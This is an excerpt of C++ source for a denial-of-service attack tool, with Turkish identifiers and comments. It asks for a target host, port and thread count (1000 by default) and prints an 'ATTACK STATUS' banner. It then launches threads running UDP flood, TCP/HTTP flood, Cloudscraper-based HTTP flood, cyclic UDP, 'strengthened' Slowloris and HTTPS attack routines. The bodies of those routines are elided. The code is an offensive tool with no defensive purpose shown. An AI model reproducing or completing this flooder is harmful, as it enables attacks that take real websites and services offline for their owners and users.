...
int main() {
    ...
    try {
        ...
        hedef_port = stoi(port_str);
        
        // Boost
        cout << BEYAZ << "└─➤  " << YESIL << "Boost? (Y/N): " << SIFIRLA;
        cin >> bost;
        
        // Thread sayısı
        cout << BEYAZ << "└─➤  " << YESIL << "Thread sayısı (Enter=1000): " << SIFIRLA;
        string thrs_input;
        cin.ignore();
        getline(cin, thrs_input);
        if (!thrs_input.empty())
            thrs = stoi(thrs_input);
        
        // URL temizleme
        string clean_host = raw_input;
        size_t pos;
        ...
        if (he == NULL) {
            cout << KIRMIZI << "[!] Fail get target info, did you type the target correct? [!]" << SIFIRLA << endl;
            return 1;
        }
        ...
        cout << BEYAZ << "ATTACK STATUS: " << SIFIRLA << endl;
        cout << "╔═════════════════" << endl;
        cout << "║ Target: " << clean_host << "   " << endl;
        cout << "║ Port  : " << hedef_port << " " << endl;
        cout << "║ BPS   : " << bytes_val << endl;
        cout << "║ Boost : " << bost << " " << endl;
        cout << "║ Bot   : " << bytes_val << " " << endl;
        cout << "╚═════════════════" << endl;
        ...
        // Thread havuzu (orijinal tool'daki 4 kısım korundu)
        ...
        for (int i = 0; i < thrs; i++) {
            ...
            if (mod == 0)
                threads.push_back(thread(udp_akisi));           // 1. KISIM: UDP
            else if (mod == 1)
                threads.push_back(thread(tcp_http_akisi));      // 2. KISIM: TCP/HTTP
            else if (mod == 2)
                threads.push_back(thread(cloudscraper_http));   // 3. KISIM: Cloudscraper
            else if (mod == 3)
                threads.push_back(thread(dongusel_udp));        // 4. KISIM: Döngüsel UDP
            else if (mod == 4)
                threads.push_back(thread(slowloris_saldiri));   // Slowloris (güçlendirilmiş)
            else
                threads.push_back(thread(https_saldiri));       // HTTPS (güçlendirilmiş)
        }
